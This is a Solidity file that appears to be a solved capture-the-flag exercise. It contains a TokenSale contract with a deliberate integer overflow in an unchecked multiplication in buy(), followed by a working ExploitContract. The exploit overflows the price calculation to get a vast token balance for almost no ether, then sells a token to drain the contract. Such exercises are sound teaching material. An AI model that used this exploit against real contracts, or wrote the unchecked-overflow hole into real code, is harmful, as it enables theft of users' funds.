// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract TokenSale {
    mapping(address => uint256) public balanceOf;
    uint256 constant PRICE_PER_TOKEN = 1 ether;

    constructor() payable {
        require(msg.value == 1 ether, "Requires 1 ether to deploy contract");
    }

    function isComplete() public view returns (bool) {
        return address(this).balance < 1 ether;
    }

    function buy(uint256 numTokens) public payable returns (uint256) {
        uint256 total = 0;
        unchecked {
            total += numTokens * PRICE_PER_TOKEN;
        }
        require(msg.value == total);

        balanceOf[msg.sender] += numTokens;
        return (total);
    }

    function sell(uint256 numTokens) public {
        require(balanceOf[msg.sender] >= numTokens);

        balanceOf[msg.sender] -= numTokens;
        (bool ok, ) = msg.sender.call{value: (numTokens * PRICE_PER_TOKEN)}("");
        require(ok, "Transfer to msg.sender failed");
    }
}

// Write your exploit contract below
contract ExploitContract {
    TokenSale public tokenSale;

    constructor(TokenSale _tokenSale) {
        tokenSale = _tokenSale;
    }

    receive() external payable {}
    // write your exploit functions below

    function exploit() public {
        // Buy method is vulnerable to overflow

        // 1. Calculate the number of tokens that enough to overflow the uint256
        uint256 tokenPrice = 1 ether;
        uint256 numTokens = (type(uint256).max) / tokenPrice + 1;

        // 2. Calculate the value to send
        uint256 valueToSend = 0;
        unchecked {
            valueToSend += numTokens * tokenPrice;
        }

        // 3. Check if the value to send is less than the token price
        require(
            valueToSend < tokenPrice,
            "Value to send is larger than token price"
        );

        // 4. Call the buy function with the calculated value and number of tokens
        tokenSale.buy{value: valueToSend}(numTokens);

        // 5. Check if the contract has more than 1 token
        require(tokenSale.balanceOf(address(this)) > 1, "Exploit failed");

        // 6. Sell one token
        tokenSale.sell(1);

        // 7. Check that exploit was successful
        require(address(tokenSale).balance < tokenPrice, "Exploit failed");
    }
}
